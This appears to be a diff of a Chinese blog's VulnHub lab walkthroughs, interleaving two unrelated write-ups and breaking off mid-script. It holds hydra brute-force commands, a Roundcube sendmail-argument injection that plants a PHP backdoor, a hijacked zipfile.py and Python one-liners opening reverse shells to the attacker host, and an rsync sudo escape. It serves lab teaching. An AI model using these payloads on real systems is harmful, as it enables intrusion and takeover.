+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1558.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;换了个字典扫了一波，扫到了一个 zmail 的目录&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1559.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;访问之后得到了一个登陆页面&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=&#34;&gt;http://192.168.0.190/zmail&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1560.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;由于已经有了三个用户名了，是有机会爆破得到密码的&lt;/p&gt;
+&lt;h3 id=&#34;hydra爆破http-get&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra爆破http-get&#34;&gt;#&lt;/a&gt; hydra 爆破 http-get&lt;/h3&gt;
+&lt;p&gt;选择模式为 http-get，选取密码为 rockyou.txt 开始爆破&lt;br&gt;
+ &lt;code&gt;hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 -f http-get /zmail/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1561.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1562.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1563.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在爆破到 12 万次的时候，得到了 p48 的密码 electrico&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1564.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;一个后台登陆地址，再次用 p48:electrico 登陆到其中成功&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1565.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;登陆成功，得到一个邮箱的后台界面&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1566.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;roundcube-邮件系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roundcube-邮件系统&#34;&gt;#&lt;/a&gt; roundcube 邮件系统&lt;/h3&gt;
+&lt;p&gt;有一封邮件，看起来比较重要，看一下什么意思&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1567.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1568.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1569.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1570.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
 &lt;blockquote&gt;
-&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
-52846 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
- 80 52845 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
+&lt;p&gt;阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQv&#34;&gt;http://192.168.0.184/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1403.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;到处看了看，发现有一个用户名和密码&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;Login Details =&amp;gt; username : hacker_in_the_town password : thanos&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1404.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到登陆界面，用这个账户密码尝试登陆&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1405.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;登陆成功，但是进入到登陆后的界面，查询之后没有任何发现&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1406.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用字典爆破目录，收集目录信息信息&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.184/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1407.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;依次访问几个目录发现没有比较明显的漏洞，换个字典，在爆破一波目录&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1408.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;爆出来的目录里边都没有什么发现，看一下下一个端口网站&lt;/p&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDUv&#34;&gt;http://192.168.0.184:52845/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1410.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.184:52845&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1411.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184:52845/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1412.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;目录都没有什么问题，看来只能对页面的功能点尝试了&lt;/p&gt;
-&lt;h3 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;#&lt;/a&gt; 任意文件读取&lt;/h3&gt;
-&lt;p&gt;在如下界面中，找到一个发送信息的功能，输入了如下信息之后发现有回显&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1414.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;点击发送消息后，读取到了 passwd 文件，审查源代码进行规范化，我们拿到了有 shell 的三个用户分别为 root，carlos，thanos&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1415.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;既然能读取文件，不妨测试一下是否能读到私钥文件，通过私钥文件登陆靶机&lt;/p&gt;
-&lt;p&gt;依次读取这三个用户下的.ssh 文件夹下的 id_rsa 文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1416.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;root 下的没有读取到，可能是做了权限设置或者不存在私钥文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1417.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;thanos 下的读取到了，审查源代码处复制私钥到本地&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1418.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;最后把 carlos 下的私钥文件看看&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1419.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这个用户下的私钥文件也没有读取到&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1420.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;特权用户计划任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特权用户计划任务&#34;&gt;#&lt;/a&gt; 特权用户计划任务&lt;/h3&gt;
-&lt;p&gt;根据泄漏的私钥文件登陆到靶机中，注意修改私钥文件的权限&lt;br&gt;
- &lt;code&gt;chmod 600 thanos_id_rsa&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;ssh thanos@192.168.31.47 -p 52846 -i ~/Desktop/vulnhub/nemesis/thanos_id_rsa&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1421.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在靶机上看到了一个备份文件内容如下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1422.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;上传 pspy 监控，看这个备份脚本有没有定期被执行&lt;br&gt;
- &lt;code&gt;wget 192.168.0.168/pspy64s -q ;chmod +x pspy64s;./pspy64s&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1423.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;看到这个 UID=1000 的用户定期执行了 backup.py 这个脚本，而在前面收集到的 /etc/passwd 文件可知，UID=1000 的用户是 carlos&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1424.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在后台中开是发送邮件，并且把数据拦截到 burp, 利用 burp 抓包，可以看到原始数据包有很多参数&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1572.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
 &lt;blockquote&gt;
-&lt;p&gt;分析这个备份文件，可知它引入了 zipfile 这个包，而它会优先在同一目录下寻找 zipfile，当脚本将被执行时，它不会使用 zipfile 模块，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS16aXBmaWxlLTJkNWsyY3NyaDlzcXQ5YXpmbWg1YnI0Znp0dzZwOWR4MzlhdWQyZC5weQ==&#34;&gt;而是会导入我们的恶意软件 zipfile.py&lt;/span&gt;，并且我们的反向 shell 也会被执行。&lt;/p&gt;
+&lt;p&gt;伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOl90b2tlbj1rcnBKOWhMSGFic1lFQUdzUzk4aXBJVkxSQmZ3SFh3VSZhbXA7X3Rhc2s9bWFpbCZhbXA7X2FjdGlvbj1zZW5kJmFtcDtfaWQ9MTEzMTU0ODgwMDYyZjcwYzVhOTBlMTYmYW1wO19hdHRhY2htZW50cz0mYW1wO19mcm9tPWV4YW1wbGVAZXhhbXBsZS5jb20=&#34;&gt;_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;amp;_task=mail&amp;amp;_action=send&amp;amp;_id=113154880062f70c5a90e16&amp;amp;_attachments=&amp;amp;_from=example@example.com&lt;/span&gt; -OQueueDirectory=/tmp -X/var/www/html/rce.php&amp;amp;_to=sssssss%&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzQwcXEuY29t&#34;&gt;40qq.com&lt;/span&gt;&amp;amp;_cc=&amp;amp;_bcc=&amp;amp;_replyto=&amp;amp;_followupto=&amp;amp;_subject=&lt;?php phpinfo();?&gt;&amp;amp;editorSelector=plain&amp;amp;_priority=0&amp;amp;_store_target=Sent&amp;amp;_draft_saveid=&amp;amp;_draft=&amp;amp;_is_html=0&amp;amp;_framed=1&amp;amp;_message=aaa&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可在本地尝试此命令是否能反弹shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; zipfile.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZIP_DEFLATED = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ZipFile:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def close(*args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def write(*args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def __init__(self, *args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;bash -c &amp;quot;bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.0.168/4444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1425.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;py反弹shell优化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py反弹shell优化&#34;&gt;#&lt;/a&gt; py 反弹 shell 优化&lt;/h3&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以不用借助bash直接用python来反弹shell，本地测试能否用在上靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.0.168&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上面的这个脚本不会反弹处标准shell，下面的这个会反弹处标准终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.0.168&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&amp;quot;HISTFILE&amp;quot;,&amp;quot;/dev/null&amp;quot;);pty.spawn(&amp;quot;/bin/bash&amp;quot;);s.close()&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h3 id=&#34;仿射加密法解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#仿射加密法解密&#34;&gt;#&lt;/a&gt; 仿射加密法解密&lt;/h3&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1573.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我们已经成功的上传上去了一个后门&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1574.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;shell转移到antsword&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell转移到antsword&#34;&gt;#&lt;/a&gt; shell 转移到 antsword&lt;/h3&gt;
+&lt;p&gt;其他没有任何信息的页面应该是如下内容&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1575.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这次直接写一个 post 的一句话后门，可用 antsword 连接&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1576.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;连接成功后门，可以继续往此后门中写入反弹 shell 的代码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1577.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;写入 mkfifo 构造好的反弹 shell 的代码并保存&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1578.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 curl 执行的同时，用来监听这个端口等到接收反弹 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1579.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;gpg文件解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gpg文件解密&#34;&gt;#&lt;/a&gt; gpg 文件解密&lt;/h3&gt;
+&lt;p&gt;发现有 p48 这个用户，切换后输入 electrico 即可切换成功&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1580.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密后的 ssh 密钥的一个密匙&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1581.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;有一个非常好的解密 gpg 的工具 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8=&#34;&gt;https://pgptool.github.io/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1582.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1583.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示需要一个密码，输入 p48 的密码 electrico&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1584.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;输入解密成功之后导出的文件的位置&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1585.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;解密成功得到了一个 ssh 的私钥文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1586.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;docker容器提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker容器提权&#34;&gt;#&lt;/a&gt; docker 容器提权&lt;/h3&gt;
+&lt;p&gt;没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个 key 理论上是可以登陆到 p48 用户的，但是需要注意的是，靶机上没有开放 ssh 端口，那我们应该怎么连呢&lt;/p&gt;
+&lt;p&gt;先把这个文件给 echo 到靶机上，并且改变私钥文件的权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1587.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
 &lt;blockquote&gt;
-&lt;p&gt;现在成功拿到了 carlos 用户，即 UID= 1000 用户的终端，看到一个加密脚本仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符 x，对应的密文字符为 y=e (x)=ax+b (mod26)，其中，a,b∈Z 26 ，且要求 gcd (a, 26 )= 1 , 函数 e (x) 称为仿射加密函数。&lt;/p&gt;
+&lt;p&gt;注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无法通过 p48 的密钥接入到 p48 用户上，那么是不是可以先用私钥文件进到一台开通了 ssh 协议的 docker 容器中呢，就试试看&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1426.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;并且在此目录下找到了一个文件提示说密码为&lt;/p&gt;
-&lt;p&gt;The password format is “****&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;FUN&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;”&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1588.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;测试一下出了 172.17.0.1 的网关地址之外，存活的 docker 主机，找到一台 172.17.0.2 是存活主机&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1589.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;ssh p48@172.17.0.2 -i id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1590.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在 docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync&lt;br&gt;
+ &lt;code&gt;sudo rsync -e &#39;sh -c &amp;quot;sh 0&amp;lt;&amp;amp;2 1&amp;gt;&amp;amp;2&amp;quot;&#39; 127.0.0.1:/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1591.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
 &lt;blockquote&gt;
-&lt;p&gt;此脚本的作用就是将原密码加密后变成了 FAJSRWOXLAXDQZAWNDDVLSU 要两个 key 值，知道 FUN 经过加密后变成了 QZA，依此推断 key 的范围。关于更多放射密码可访问 https://en.wikipedia.org/wiki/Affine_cipher&lt;/p&gt;
+&lt;p&gt;提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机直接通信，连接到 172.17.0.1 就相当于连接到了宿主机，而我们在 docker 内部连的时候是不需要外部开通 22 端口的  &lt;code&gt;ssh root@172.17.0.1&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 1.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def affine_encrypt(text, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return &amp;#x27;&amp;#x27;.join([ chr((( key[0]*(ord(t) - ord(&amp;#x27;A&amp;#x27;)) + key[1] ) % 26) + ord(&amp;#x27;A&amp;#x27;)) for t in text.upper().replace(&amp;#x27; &amp;#x27;, &amp;#x27;&amp;#x27;) ])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_text=&amp;quot;FUN&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for key0 in 